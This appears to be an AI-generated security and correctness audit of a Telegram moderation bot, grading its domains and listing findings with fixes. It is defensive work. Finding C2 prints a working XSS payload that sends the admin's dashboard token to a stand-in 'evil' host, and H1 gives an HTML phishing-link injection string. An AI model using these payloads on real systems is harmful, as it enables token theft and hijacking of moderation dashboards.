# DayaCID Bot — Codebase Audit Report

**Date:** 2026-07-15
**Scope:** Full repository (`api/`, `lib/`, `public/`, config) — ~2,000 LOC application code + 1,056-line dashboard.
**Method:** 12 parallel domain-audit agents → 3 adversarial verification agents → orchestrator synthesis. Every directory covered by ≥2 lenses. All CRITICAL/HIGH findings confirmed at file:line with HIGH confidence.

---

## 1. Executive Summary

| Domain | Grade | One-line justification |
|---|---|---|
| Security | **D** | Unauthenticated webhook, stored dashboard XSS, HTML injection, fail-open setup auth. |
| Correctness | **D** | Captcha re-trigger loop, permanent-mute footgun, double-captcha wrongful ban, media flood gap. |
| Data & State | **D** | Core moderation state lives in per-instance memory on ephemeral/concurrent serverless; non-atomic writes. |
| Error handling | **D** | No fetch timeouts, unchecked Telegram mutations, no 429 handling, silent empty catches. |
| Frontend | **D** | Stored XSS in activity feed, universal error-swallowing, chart re-init crash. |
| Config / Deploy | **C** | Fail-open setup secret, no security headers, no region pin; but clean gitignore, no committed secrets. |
| Architecture | **C** | Boundaries mostly hold; enforcement-ladder duplication + drift, one layering inversion. |
| Performance | **C** | `isAdmin` uncached per message, sequential awaits, per-message KV read; fine at low volume. |
| API contracts | **C** | `chat_join_request` subscribed but unhandled; client/server error-shape mismatches. |
| Code quality | **C** | Enforcement duplication, dead imports, fictional architecture docs. |
| Dependencies | **B** | Zero-dependency design is a genuine strength; only CDN SRI gap. |
| Testing | **F** | No tests and no CI; the spam-scoring tuning surface has zero regression net. |

### Top 5 Risks
1. **Unauthenticated webhook (C1)** — anyone who guesses the URL can forge Telegram updates to ban/mute arbitrary users or impersonate admin commands.
2. **Stored DOM XSS in dashboard (C2)** — any Telegram user's display name can steal the admin's dashboard token and seize full moderation control.
3. **Captcha re-trigger loop (C3)** — the bot's own "unmute" re-fires the join flow, re-muting every verified user and eventually banning legitimate members.
4. **Permanent-mute footgun (C4)** — captcha state is memory-only; a serverless cold start leaves a joining user muted forever with no recovery path.
5. **No external-call timeouts (C5)** — one hung Telegram/Upstash call exhausts the 10s budget, causing Telegram to redeliver the update and double-apply enforcement.

---

## 2. Confirmed Findings (severity-sorted)

Each finding lists the merged IDs from the domain lenses. "Lenses" = how many independent agents flagged it (corroboration signal).

### CRITICAL

**C1 — Unauthenticated webhook endpoint (no `secret_token`)** · Lenses: 2 (security, config)
- **Location:** `api/webhook.js:17-55`, `lib/telegram.js:162-167` (`setWebhook`), `api/setup.js:40-45`
- **Evidence:** `setWebhook` sends no `secret_token`; `handler()` reads `req.body` with no verification of `X-Telegram-Bot-Api-Secret-Token`. Repo-wide search: zero occurrences of `secret_token`.
- **Impact:** The webhook URL is public and guessable. An attacker POSTs forged `Update` JSON to: ban/mute any `chatId`/`userId`, forge admin `/ban`/`/trust` commands (`isAdmin` validates against Telegram, so a forged `from.id` matching a real admin authorizes the command), bypass captcha via forged `callback_query`, and flood the bot's Telegram quota.
- **Fix:** Generate a random `WEBHOOK_SECRET`; pass it as `secret_token` in `setWebhook`; reject requests whose `X-Telegram-Bot-Api-Secret-Token` header fails a constant-time compare, before processing the body. (Backward-compatible: enforce only when the env var is set.)

**C2 — Stored DOM XSS in dashboard activity feed** · Lenses: 2 (frontend, api-contracts) + verified; security lens's "clean" verdict rejected
- **Location:** `public/dashboard.html:1043-1044` (render), `:1074-1076` (`escAttr`); provenance `api/webhook.js:64` → `lib/telegram.js:192-203` → `lib/state.js:216-236` → `api/dashboard/activity.js`
- **Evidence:** Quick-action buttons are built as `onclick="quickAction('ban',...,'${escAttr(item.username||'')}',this)"` via `innerHTML`. `escAttr` HTML-entity-encodes quotes, but the browser entity-**decodes** the attribute before compiling the inline handler as JS, so `&#39;` becomes a literal `'` and breaks out of the JS string. `username` = `message.from.username || first_name` (attacker-controlled), unsanitized through the entire KV→API chain.
- **Impact:** A spammer sets their first name to `x');fetch('//evil/'+sessionStorage.dash_token);//` (<64 chars) and self-triggers any moderation event. When the admin opens the dashboard, arbitrary JS runs in-origin, exfiltrating `dash_token` (the raw `DASHBOARD_SECRET`) and enabling ban/unban/config calls. Full admin-console compromise via one Telegram message.
- **Fix:** Never interpolate untrusted data into inline `onclick`. Build rows with `createElement`/`textContent` and attach listeners via `addEventListener`, passing raw values (or via `data-*` attributes).

**C3 — Captcha re-trigger loop (bot's own unmute re-fires join flow)** · Lenses: 1 (correctness) + verified + orchestrator-read
- **Location:** `lib/captcha.js:34` (trigger), `:190` (`unrestrictUser` on success)
- **Evidence:** Join trigger fires when `oldStatus ∈ {left,kicked,restricted} && newStatus==='member'`. On captcha pass, `unrestrictUser` flips the user `restricted → member`; the bot is an admin, so Telegram emits a `chat_member` update matching that exact condition. `handleChatMember` never checks whether the actor (`chatMember.from.id`) is the bot.
- **Impact:** Every successful verification re-mutes the user and issues a fresh captcha; the same fires whenever any temporary spam/forward mute **expires** (`restricted → member`). Users who stop answering are banned by the timeout sweep. The captcha system actively breaks itself for legitimate members.
- **Fix:** Skip the handler when the actor is the bot (cache `getMe().id`); and/or only treat `oldStatus ∈ {left,kicked}` as a new join. Handle genuine re-verification via an explicit signal.

**C4 — Permanent mute on cold start (captcha state memory-only)** · Lenses: 2 (data, correctness) + verified
- **Location:** `lib/state.js:9` (`pendingVerifications = new Map()`), `lib/captcha.js:61` (permanent mute), `:183-186` (`!pending` branch)
- **Evidence:** `pendingVerifications` has no KV backing. The join mute uses `restrictUser(..., {canSend:false})` with no `untilDate` → permanent. If the instance recycles before the user answers, the callback hits the `!pending` branch, which says "expired, leave and rejoin" **without unmuting**, and `cleanupExpiredVerifications` can't act (entry gone).
- **Impact:** A joining user is muted forever with no automated recovery; likely in practice given the 2-minute window vs. common cold starts.
- **Fix:** Persist pending verifications to KV (TTL ≈ `CAPTCHA_TIMEOUT_MS + buffer`); read hybrid like warnings. Unmute in the `!pending` recovery branch as a safety net.

**C5 — No timeout/AbortSignal on any Telegram or Upstash fetch** · Lenses: 1 (error) + verified by read
- **Location:** `lib/telegram.js:8-20` (`callTelegram`, `getMe`, `getWebhookInfo`); `lib/state.js:17-53` + all KV calls; `lib/config.js:31`
- **Evidence:** Only `lib/cas.js` uses `AbortSignal.timeout`. Every other external call can hang until the platform socket timeout, which exceeds the 10s Vercel `maxDuration`. The webhook hot path chains many sequential awaits.
- **Impact:** One hung call kills the function before it returns 200 → Telegram redelivers the update → full enforcement path re-runs (double ban/mute, double warning increment, duplicate messages).
- **Fix:** Add `signal: AbortSignal.timeout(N)` to every fetch (Telegram ~3-4s, Upstash ~2s). Treat timeout as a normal failure (degrade to in-memory).

### HIGH

**H1 — HTML injection into Telegram messages (unescaped user text in `parse_mode:HTML`)** · Lenses: 2 (security, api-contracts)
- **Location:** `lib/telegram.js:192-203` (`logToAdmin`); `api/webhook.js:124,138,162,214,228,241,282,294,319,341,355`; `lib/captcha.js:79,140`; `lib/commands.js` message builders
- **Evidence:** `username`/`first_name`/forward titles are concatenated raw into `<b>…</b>` strings sent with `parse_mode:'HTML'`. No escaping anywhere.
- **Impact:** A user sets their name to `<a href="https://evil">CLICK</a>` → the trusted bot renders a clickable phishing link to the whole group. Unbalanced tags make Telegram reject the message (400), silently dropping ban/mute notifications and the admin-channel audit entry exactly when a hostile actor is involved.
- **Fix:** Add `escapeHtml()` and apply to every user-controlled value before HTML interpolation.

**H2 — Double captcha → wrongful ban of correct answerers** · Lenses: 1 (architecture) + verified
- **Location:** `api/setup.js:40-45`, `api/webhook.js:37-49,73-76`, `lib/captcha.js:87,148`
- **Evidence:** Both `chat_member` and `new_chat_members` are subscribed; a join delivers both as separate updates, and `handleMessage` explicitly does not return after `handleNewChatMembers`. Both handlers create a captcha with no `pendingVerifications.has(key)` guard; the second `.set()` overwrites the first challenge's answer.
- **Impact:** Two captcha messages; the first is orphaned (never deleted). A user who answers the **first** (now-stale) captcha is judged against the second answer → wrongfully banned.
- **Fix:** Make paths mutually exclusive or guard on `pendingVerifications.has(key)`; extract one `startVerification()` helper.

**H3 — Stale trusted-user cache bypasses anti-spam across instances** · Lenses: 1 (data) + verified
- **Location:** `lib/state.js:82` (`isTrusted` short-circuit)
- **Evidence:** `isTrusted` returns `true` on any in-memory Set hit, never re-checking KV, with no TTL. `/untrust` clears only the local instance's Set + KV.
- **Impact:** After `/untrust`, every other warm instance keeps treating the user as trusted (which fully bypasses spam scoring in `spam.js`) until it cold-starts.
- **Fix:** Add periodic revalidation of the local trust cache against KV, or a tombstone/versioned invalidation.

**H4 — `deleteWarnings` runs after a failed ban (enforcement reset)** · Lenses: 2 (error, correctness) + verified
- **Location:** `api/webhook.js:132, 169, 219`, report paths `:303-304, 327-328, 349-350`
- **Evidence:** `deleteWarnings` sits outside the `if (banResult?.ok)` block in every ban path.
- **Impact:** If the ban API call fails (missing permission, 429, hung fetch → null), the user is not banned but their warning ladder is wiped to zero — a repeat offender restarts at offense #1.
- **Fix:** Move `deleteWarnings`/`clearReports` inside the `if (banResult?.ok)` branch; on failure keep warnings and log a distinct alert.

**H5 — Enforcement threshold drift (3 of 4 paths hardcode `warnings >= 2`)** · Lenses: 1 (architecture) + verified
- **Location:** `api/webhook.js:120, 158, 337` vs `:211`
- **Evidence:** Only `enforceSpam` uses `getThreshold('MAX_WARNINGS_BEFORE_BAN')`; the forward-channel, forward-user, and report paths hardcode `warnings >= 2` on the shared counter.
- **Impact:** The dashboard's "Max Warnings Before Ban" override silently does nothing for 3 of 4 paths; even at defaults, behavior is inconsistent (ban on 2nd offense here vs 3rd in `enforceSpam`).
- **Fix:** Use `getThreshold('MAX_WARNINGS_BEFORE_BAN')` everywhere, ideally via one shared `applyGraduatedEnforcement()` helper.

**H6 — Flood/burst detection skipped for captionless media** · Lenses: 1 (correctness) + verified
- **Location:** `lib/spam.js:169` (early return on empty `text`), `api/webhook.js:63`
- **Evidence:** `isSpam` returns `{score:0}` before `analyzeUserBehavior`/`recordMessageTime` when `text===''`. For stickers/photos without caption, `text` is `''`.
- **Impact:** A flood of 20 stickers/second is completely undetected; message-time tracking never records these.
- **Fix:** Call `analyzeUserBehavior` (record + evaluate) before the empty-text early return.

**H7 — Setup endpoint fails open on missing secret** · Lenses: 2 (security, config)
- **Location:** `api/setup.js:17-25`, `lib/config.js:5`
- **Evidence:** `expectedSecret = process.env.SETUP_SECRET || TOKEN`; `TOKEN` falls back to the public literal `'DEV_TOKEN_NOT_SET'`. Secret accepted via query string; the 403 response hints the scheme.
- **Impact:** If `SETUP_SECRET` is unset, the setup endpoint's secret becomes the bot token (leak-prone in URLs); if the token is also unset, auth degrades to a repo-public string, letting anyone repoint the webhook.
- **Fix:** Require `SETUP_SECRET` explicitly, fail closed (503) like `dashboardAuth`; accept via header only; drop the disclosing hint. *(HUMAN-GATE — see Fix Plan.)*

**H8 — `chat_join_request` subscribed but has no handler** · Lenses: 1 (api-contracts) + verified
- **Location:** `api/setup.js:40-45` vs `api/webhook.js:34-51`
- **Evidence:** `allowedUpdates` includes `'chat_join_request'`; the router has no branch for it → falls through to default 200.
- **Impact:** In groups requiring join approval, every request is silently dropped — never approved, never captcha'd.
- **Fix:** Add a handler (approve + captcha) or remove `'chat_join_request'` from `allowedUpdates`.

**H9 — No handling of Telegram 429 / `retry_after`** · Lenses: 1 (error) + grep-confirmed
- **Location:** `lib/telegram.js:8-20` (all mutations)
- **Evidence:** Repo-wide search for `429`/`retry_after` → nothing. `callTelegram` returns the parsed body regardless of status.
- **Impact:** During raids (peak load), bans/mutes start failing with no retry exactly when enforcement matters most.
- **Fix:** In `callTelegram`, detect `error_code===429`, wait `retry_after` (capped to budget), retry once; surface 429s in logs.

**H10 — Non-atomic warning increment (lost updates)** · Lenses: 3 (data, correctness, performance) + verified
- **Location:** `lib/state.js:57-70`, callers in `api/webhook.js`
- **Evidence:** `getWarnings` + `setWarnings` is a GET-then-SET, not `INCR` (which `incrementStat` already uses).
- **Impact:** Two near-simultaneous violations both read N and write N+1 → a lost increment lets an offender avoid the ban threshold.
- **Fix:** Use `INCR warn:{key}` + `EXPIRE` in one pipeline; treat the returned value as truth.

**H11 — `isAdmin` uncached: a Telegram round-trip per message** · Lenses: 1 (performance)
- **Location:** `lib/telegram.js:129-138`, `api/webhook.js:103`
- **Evidence:** `isAdmin` calls `getChatMember` with no cache, on every non-command message before spam scoring.
- **Impact:** ~80-250ms added to every message; extra egress and 10s-budget pressure under load.
- **Fix:** Cache admin membership per chat with a short TTL (like `casCache`).

**H12 — Webhook URL built from client-controlled `Host` header** · Lenses: 1 (config)
- **Location:** `api/setup.js:34-37`
- **Evidence:** `webhookUrl` = ``${proto}://${host}/api/webhook`` from `X-Forwarded-Host`/`Host`, no allowlist.
- **Impact:** An authenticated setup caller with a spoofed `Host` repoints the webhook to an attacker server — full update-exfiltration. Compounds with H7.
- **Fix:** Build the webhook URL from a fixed `PUBLIC_URL`/`VERCEL_URL` env, not request headers.

### MEDIUM (condensed)

| ID | Location | Issue | Fix |
|---|---|---|---|
| M1 | dashboard.html:853-868, 1161-1172 | `dashFetch` only throws on 401/403; `saveConfig` always toasts success even on 400 | Check `r.ok`; surface `d.error` |
| M2 | state.js:310-325 | `registerActiveChat` does `kvGet`+parse every message; non-atomic RMW on shared blob | In-memory known-set; `HSET` per chat |
| M3 | api/dashboard/stats.js:13-22 | Sequential `await getStats` in for-loop over N chats | `Promise.all(chatIds.map(getStats))` |
| M4 | state.js (all KV writes) | Empty `catch{}` with no logging → silent persistence loss | `console.error` in catches |
| M5 | state.js:11,340-354 | `autoDeleteQueue` memory-only; lost on cold start | KV sorted set or Vercel Cron |
| M6 | state.js:180-195 | `newMembers` memory-only → grace threshold inconsistent across instances | KV TTL 30min, hybrid read |
| M7 | state.js:134-153 | `userReports` memory-only → "3 reporters" feature unreliable (fallback exists) | KV `SADD`/`SCARD` + TTL |
| M8 | dashboardAuth.js, setup.js | No rate limiting on auth attempts | KV-backed IP/global counter |
| M9 | webhook.js:109 | `forwardFromChat` misses `forward_origin?.sender_chat` | Add `sender_chat` fallback |
| M10 | action.js:57-67 | Uniform 1-30 bound; `INSTANT_BAN < SPAM` invertible; `MAX_WARNINGS=30` disables ban | Per-key ranges + invariant |
| M11 | activity.js:6-7 | `limit` not validated → `NaN`/negative `LRANGE` returns wrong slice | Clamp `limit >= 1` |
| M12 | dashboard.html:975-1011 | `initChart` never `destroy()`s → re-login crashes dashboard | Destroy prior chart first |
| M13 | state.js Maps, cas.js | No TTL sweep of inactive-user entries → slow memory growth | Periodic sweep in cleanup pass |
| M14 | captcha.js:54,115 | CAS-ban `banUser` result unchecked → false "banned" while spammer stays | Check `result.ok`, fall through |
| M15 | captcha.js:61,122 | Mute `restrictUser` result unchecked before captcha | Check result, log on failure |
| M16 | webhook.js:93 | `is_bot` check after report/command blocks → bot can game reports | Move `is_bot` to top of `handleMessage` |
| M17 | dashboard.html:7 | Chart.js CDN without SRI (3 lenses) | Add `integrity`+`crossorigin` or vendor locally |
| M18 | vercel.json | No security headers (X-Frame-Options, CSP, nosniff) → clickjacking on login | Add `headers` block |
| M19 | config.js + state.js | Two impls read `dashboard:config` with divergent fallback | Extract env leaf module, dedupe |
| M20 | dashboard/health.js:3-16 | Reimplements `getMe`/`getWebhookInfo` inline with raw TOKEN | Use `telegram.js` exports |
| M21 | telegram.js:4 | Transport layer imports state.js (dependency inversion) | Move calls to call sites |
| M22 | dashboardAuth.js:29-38 | `withAuth` doesn't wrap handler in try/catch → raw 500s | Wrap in try/catch → JSON 500 |
| M23 | webhook.js handler | No `update_id` idempotency → redelivery double-applies | KV `SET NX EX` dedup |
| M24 | config.js:5 | `TOKEN` silent `'DEV_TOKEN_NOT_SET'` fallback → moderation silently off | Validate at init, log loudly |

### LOW (condensed)
Unused imports (`getReportCount`, static `SPAM_THRESHOLD`/`INSTANT_BAN_THRESHOLD`/`MAX_WARNINGS_BEFORE_BAN` in webhook.js & spam.js) · magic numbers not in config (`0.7` caps ratio, `30*60*1000` grace) · `.claude/architecture.md` & `.cursor/architecture.md` describe a **fictional Python/PostgreSQL/TensorFlow stack** and are byte-identical · `hasObfuscation` checks a subset of the chars `normalizeText` strips · `chatId` left as string in captcha cleanup while `userId` is `Number()`'d · unauthenticated `/api/health` info disclosure · token may reach logs via `console.error(error)` · CAS error result cached as negative for 1h · `safeEqual` length short-circuit timing (accepted pattern) · ReDoS-shaped patterns in spam.js (anchored, bounded) · `sender_chat` skips all moderation (requires admin to exploit — downgraded) · dashboard read endpoints lack method checks · CLAUDE.md/README doc drift · dead try/catch in health.js · **no test suite (F)**.

---

## 3. Systemic Patterns

1. **Serverless-hostile in-memory state (the dominant theme).** `pendingVerifications`, `userReports`, `newMembers`, `autoDeleteQueue`, the `trustedUsers` cache, and the warning read-modify-write all assume one long-lived process. On Vercel's ephemeral, concurrent instances they silently fail. Root cause behind C4, H2, H3, H10, M5, M6, M7, M13, M23. **A single "persist ephemeral state to KV" initiative resolves most of these.**
2. **Unchecked Telegram mutation results.** `banUser`/`restrictUser` return values are ignored or mishandled, so the code logs/report success and mutates state while the action silently failed (H4, M14, M15, and the CAS-ban path).
3. **No external-call resilience.** No timeouts, no 429 handling, blanket empty catches with no logging (C5, H9, M4). One slow dependency cascades into duplicate enforcement via Telegram retries.
4. **Escaping exists but is wrong for the sink.** `escapeHtml` is missing for Telegram HTML messages (H1); `escAttr` is the wrong encoding for the dashboard's inline-`onclick` JS context (C2). Both are "an escape is applied, but not the one the context needs."
5. **Config-override drift.** `getThreshold()` (dynamic) vs hardcoded literals and dead static imports (H5, M10, unused imports). The abstraction exists but isn't used consistently.
6. **Trust-boundary gaps.** Webhook unauthenticated (C1), setup fail-open (H7), Host-header trust (H12), health disclosure — the ingress surfaces are under-validated.

**Cross-domain interaction risks noted for remediation:**
- The webhook-secret check (C1) must run **before** body processing to close the forged-payload class.
- Persisting captcha state (C4) and de-duplicating captcha triggers (H2) both touch `pendingVerifications` → do them as one coherent captcha unit.
- Atomic `INCR` (H10) and "don't reset warnings on failed ban" (H4) both live in the enforcement code → coordinate.
- The XSS fix (C2) rewrites the activity-render function that M1/M12 also touch → bundle the dashboard fixes.

---

## 4. Prioritized Remediation Roadmap

**Quick wins (<1 day, low blast radius) — do first**
- C2 dashboard XSS (client-only rewrite of activity render) · H1 `escapeHtml` helper · H4 gate `deleteWarnings` on ban success · H5 use `getThreshold` in all paths · H6 flood-before-early-return · M9 `sender_chat` forward · M11 clamp activity limit · M16 move `is_bot` check up · M1/M12 dashFetch/chart fixes · M10 per-key config bounds · unused-import & magic-number & doc-drift LOWs.

**High-impact (days) — resilience & correctness**
- C5 fetch timeouts (all external calls) · C3 captcha self-actor guard · C4 + H2 captcha KV persistence + dedup (one unit) · H10 atomic `INCR` warnings · H9 429 retry · H3 trust-cache revalidation · H11 admin cache · M4 KV error logging · M5/M6/M7 persist ephemeral state · M14/M15 check mutation results · **new: zero-dep `node:test` suite** for `normalize.js`/`spam.js`/`captcha.js` pure functions (safety net for all scoring edits).

**Structural / operational (needs human decision — HUMAN-GATE)**
- C1 webhook `secret_token` verification (requires setting `WEBHOOK_SECRET` + re-running `/api/setup`; code can ship backward-compatibly but activation is operational).
- H7 setup fail-closed (dropping the token fallback can lock out an operator who relies on it).
- H12 fixed webhook URL env · H8 `chat_join_request` (implement vs unsubscribe — product decision) · M8 rate limiting · M17/M18 SRI + security headers.

---

## 5. What Was NOT Audited (honest scope limits)
- **Live/runtime behavior:** no deploy was exercised; findings are from static reading. Telegram API semantics (e.g., exact `chat_member` emission on unrestrict) are asserted from documented behavior, not observed on a live bot.
- **Upstash/Vercel account config:** region placement, actual KV latency, env-var values, and Vercel WAF settings are outside the repo and unverified.
- **Telegram bot permissions** in real chats (the `/check`-verified admin rights) — assumed, not tested.
- **CAS API contract** (`api.cas.chat`) — treated as an external dependency; its response schema wasn't validated against live data.
- **Load/penetration testing** — the ReDoS and brute-force findings are by inspection, not measured.
- **Dashboard visual/UX and accessibility** beyond security/reliability.

---

## 6. Iteration Log
- **Iteration 1 — Phase 1:** dispatched 12 domain agents (security, correctness, architecture, performance, error-handling, data/state, testing, dependencies, config/deploy, code-quality, api-contracts, frontend). ~120 raw findings.
- **Iteration 1 — Phase 2:** dispatched 3 adversarial verification agents (captcha/state, webhook enforcement, dashboard/security) covering all CRITICAL/HIGH. Orchestrator independently read `captcha.js`, `webhook.js`, `config.js`, `state.js`.
  - **Confirmed:** C1, C2, C3, C4, C5, H1-H12 and most MEDIUMs.
  - **Downgraded:** userReports-memory CRITICAL→MEDIUM (M7, fallback exists); `sender_chat`-skips-moderation MEDIUM→LOW (needs admin to exploit); forward-policy-vs-CLAUDE.md HIGH→doc-drift (intentional softening per commit `ceecbd2`).
  - **Rejected:** security lens's "dashboard.html is clean" verdict (C2 proves it wrong); `safeEqual` timing treated as accepted-practice LOW.
- **Convergence:** every directory covered by ≥2 lenses; all CRITICAL/HIGH confirmed at file:line, HIGH confidence; the state-concurrency cluster (natural follow-up-sweep trigger) was fully covered by the verification pass. **Converged in 1 iteration — no additional loop required.**

---
*Proceed to `FIX_PLAN.md` for the remediation units.*
